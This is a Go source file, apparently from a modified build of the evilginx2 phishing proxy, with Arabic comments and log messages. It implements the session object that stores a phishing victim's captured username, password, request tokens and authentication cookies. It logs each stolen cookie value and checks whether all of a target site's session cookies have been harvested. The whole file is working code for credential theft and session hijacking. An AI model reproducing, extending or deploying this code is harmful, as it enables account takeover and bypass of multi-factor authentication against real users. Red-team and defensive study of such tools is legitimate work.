package core

import (
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type Session struct {
	Id             string
	Name           string
	Username       string
	Password       string
	Custom         map[string]string
	Params         map[string]string
	BodyTokens     map[string]string
	HttpTokens     map[string]string
	CookieTokens   map[string]map[string]*database.CookieToken
	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
	CountryCode    string
	Country        string
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		RemoteAddr:     "",
		UserAgent:      "",
		CountryCode:    "",
		Country:        "",
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCountry(country string) {
	log.Debug("تعيين اسم البلد للجلسة %s: %s", s.Id, country)
	s.Country = country
}

func (s *Session) SetCountryCode(countryCode string) {
	log.Debug("تعيين رمز البلد للجلسة %s: %s", s.Id, countryCode)
	s.CountryCode = countryCode
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, name string, value string, path string, httpOnly bool, expires time.Time) bool {
	domain = strings.ToLower(domain)
	
	// تسجيل المعلومات التشخيصية
	log.Debug("إضافة كوكي: %s = %s إلى المجال %s", name, value, domain)
	
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}
	
	// الاحتفاظ بحالة الأحرف الأصلية للاسم
	originalName := name
	
	s.CookieTokens[domain][originalName] = &database.CookieToken{
		Name:     originalName,
		Value:    value,
		Path:     path,
		HttpOnly: httpOnly,
		ExpirationDate: func() int64 { if !expires.IsZero() { return expires.Unix() } else { return 0 } }(),
	}

	log.Success("تمت إضافة كوكي إلى الجلسة: %s=%s (المجال: %s)", originalName, value, domain)
	
	// تحقق من الإضافة
	if token, exists := s.CookieTokens[domain][originalName]; exists {
		log.Debug("تحقق من الإضافة: %s = %s", originalName, token.Value)
		return true
	} else {
		log.Error("فشل إضافة الكوكي %s: غير موجود بعد الإضافة!", originalName)
		return false
	}
}

func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		return true
	}
	return false
}

func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}
